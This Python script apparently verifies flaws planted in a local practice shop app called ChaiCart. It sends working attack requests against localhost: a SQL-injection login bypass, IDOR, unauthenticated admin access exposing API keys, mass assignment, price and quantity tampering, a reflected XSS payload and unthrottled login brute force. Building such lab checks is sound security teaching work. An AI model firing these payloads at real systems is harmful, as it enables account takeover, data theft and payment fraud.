"""Phase-0 proof: hit each planted ChaiCart flaw by hand and show it lands."""
import sys
import requests

B = "http://127.0.0.1:5001"
P = F = 0


def check(name, cond, evidence):
    global P, F
    tag = "[PROVEN]" if cond else "[ MISS ]"
    if cond:
        P += 1
    else:
        F += 1
    print(f"  {tag} {name}\n           -> {evidence}")


# 1. SQL injection — auth bypass with a wrong password
r = requests.post(B + "/login", data={"username": "admin' -- ", "password": "wrong"})
j = r.json()
check("SQL injection (auth bypass)", j.get("ok") is True,
      f"logged in as role='{j.get('role')}' using password 'wrong' -> {r.text.strip()}")

# 2. IDOR — alice reads bob's order
a = requests.Session()
a.post(B + "/login", data={"username": "alice", "password": "alicepass"})
r = a.get(B + "/order/1002")
check("IDOR (read another user's order)",
      r.status_code == 200 and r.json().get("user_id") == 2,
      f"alice fetched order 1002 owned by user_id=2: {r.text.strip()}")

# 3. Broken access control — /admin with no auth
r = requests.get(B + "/admin")
check("Broken access control (/admin, no auth)",
      r.status_code == 200 and "api_key" in r.text,
      f"anonymous pulled admin panel incl. api keys: {r.text[:80]}...")

# 4. Mass assignment — admin at signup
r = requests.post(B + "/signup", data={"username": "hacker", "password": "x", "role": "admin"})
check("Mass assignment (admin at signup)", r.json().get("role") == "admin",
      f"self-registered with role={r.json().get('role')}")

# 5. Price tampering — client sets the price
r = requests.post(B + "/checkout", data={"price": "1", "qty": "1"})
check("Price tampering (client-set price)", r.json().get("total") == 1.0,
      f"checked out for total={r.json().get('total')} (real item is ₹2500)")

# 6. Negative quantity — credit abuse
r = requests.post(B + "/checkout", data={"price": "500", "qty": "-3"})
check("Negative quantity (credit abuse)", r.json().get("total") < 0,
      f"qty=-3 -> total={r.json().get('total')}")

# 7. Reflected XSS
payload = "<script>alert(1)</script>"
r = requests.get(B + "/search", params={"q": payload})
check("Reflected XSS", payload in r.text, "payload reflected unescaped into HTML")

# 8. No rate limiting
codes = [requests.post(B + "/login", data={"username": "x", "password": "y"}).status_code
         for _ in range(15)]
check("No rate limiting (brute force)", all(c != 429 for c in codes),
      f"15 rapid logins, none throttled (statuses={sorted(set(codes))})")

print(f"\n  RESULT: {P} proven, {F} missed (of {P + F})")
sys.exit(0 if F == 0 else 1)
